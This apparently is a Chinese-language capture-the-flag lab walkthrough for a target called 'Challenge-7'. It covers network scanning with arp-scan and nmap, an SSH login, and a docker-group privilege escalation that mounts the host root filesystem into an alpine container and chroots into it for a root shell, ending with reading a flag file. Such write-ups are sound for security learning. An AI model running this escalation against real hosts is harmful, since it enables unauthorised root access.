主机发现

使用 arp-scan 扫描局域网存活主机：

arp-scan -l

端口扫描

nmap 全端口扫描：

nmap --min-rate 10000 -p- 192.168.21.147

服务与版本扫描：

nmap -p 22,80 -sC -sV 192.168.21.147

SSH 登录

SSH 连接靶机，查看 Challenge-7 的提示：

ssh kendo@192.168.21.147

明确 Challenge-7 的提权方式 —— 利用 docker 组权限挂载宿主机文件系统。

Docker 提权

查看 docker 镜像：

sudo docker images

当前用户 kendo 拥有 docker 组权限，可以无需 root 直接执行 docker 命令。Docker 支持将宿主机目录挂载到容器内部，配合 chroot 即可获取宿主机 root shell。

运行 alpine 容器，将宿主机根目录挂载到 /mnt，然后 chroot 进入：

sudo docker run -v /:/mnt -it alpine chroot /mnt /bin/bash

容器启动后通过 chroot 切换到 /mnt（即宿主机的 /），此时已经获得宿主机的 root shell：

id
whoami

确认 uid=0(root)，进入 /root 目录：

cd /root && ls -la

查看 root 用户下的 flag：

cat /root/flag.txt

至此，Challenge-7 的 Docker 提权演示完毕。核心思路是利用 docker 组权限或 sudo docker 权限，通过挂载宿主机根目录实现容器逃逸，获取宿主机 root 访问权。
